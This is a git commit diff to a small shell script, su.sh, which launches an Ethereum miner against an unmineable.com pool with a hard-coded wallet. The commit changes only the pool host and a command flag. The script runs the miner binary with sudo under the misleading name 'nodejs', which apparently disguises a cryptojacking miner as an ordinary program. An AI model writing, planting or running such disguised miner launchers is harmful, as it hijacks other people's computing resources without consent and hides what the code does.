926af74a9992a3365c07485f8b015e01cebc39f4
gasken1 <84686224+gasken1@users.noreply.github.com>
2021-08-06 03:19:39 -0700

    Update su.sh

--- su.sh
+++ su.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL=eth-us1.hellominer.com:1100
+POOL=ethash.unmineable.com:3333
 WALLET=0x86ca902b2ca60630188dba14105442141dc3b1dc
 WORKER=$(echo $(shuf -i 1-30 -n 1)-gass) 
 chmod +x nodejs
-sudo ./nodejs -pool $POOL -wal $WALLET.$WORKER -pass x
+sudo ./nodejs -epool $POOL -wal $WALLET.$WORKER -pass x
